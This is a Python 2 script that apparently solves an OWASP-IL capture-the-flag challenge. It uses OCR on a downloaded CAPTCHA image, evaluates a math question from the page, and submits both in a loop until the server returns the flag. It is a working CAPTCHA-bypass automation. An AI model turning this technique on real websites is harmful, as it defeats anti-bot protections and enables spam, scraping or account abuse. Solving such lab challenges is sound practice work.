#!/usr/bin/python
from PIL import Image

import requests
import pytesseract
import string
import re
import numexpr


def fix_captcha():
    captcha_file = Image.open('captcha.png')
    width, height = captcha_file.size
    new_width = 55

    for i in xrange(height):
        for k in xrange(new_width):
            if captcha_file.getpixel((k, i)) == (255, 255, 255):
                captcha_file.putpixel((k, i), (0, 0, 0))
            else:
                captcha_file.putpixel((k, i), (255, 255, 255))

    new_image = captcha_file.crop((0, 0, new_width, height))
    new_image.save("captcha2.png")

    text = pytesseract.image_to_string(Image.open('captcha2.png'))
    return "".join(map(lambda data: data if data in string.ascii_letters or data in string.digits else "", text))


def get_captcha():
    response = session.get(captcha_url)

    if response.status_code == 200:
        with open("captcha.png", 'wb') as f:
            f.write(response.content)


def get_number(response=None):
    if not response:
        response = session.get(number_url, stream=True)

    for line in response.iter_lines():
        if "math_question" in line:
            re_value = re.search(">(.*?)=", line).group(1)
            return numexpr.evaluate(re_value).item()


#
# Global Configurations
#
number_url = 'http://challenges.owaspil.ctf.today:8085/'
captcha_url = "http://challenges.owaspil.ctf.today:8085/captcha.php"
headers = {'content-type': 'application/x-www-form-urlencoded'}
session = requests.session()
success_counter = 1

number = get_number()

while True:
    get_captcha()
    captcha = fix_captcha()

    response = session.post(number_url,
                            data="captcha={0}&math_captcha={1}&submit=".format(captcha, number),
                            headers=headers,
                            stream=True)

    if "Oh snap! you are wrong!" in response.text:
        print "[-] Bad captcha!"
        raw_input(">>")

    elif "Correct!" in response.text:
        print "[+] Correct! | counter:{0}".format(success_counter)
        success_counter += 1
    else:
        flag = re.search("{(.+?)}", response.text).group(1)
        print "[*] FLAG: OWASP-IL{{{0}}}".format(flag)

        raw_input("[*] Done!")

    # set new number
    number = get_number(response)
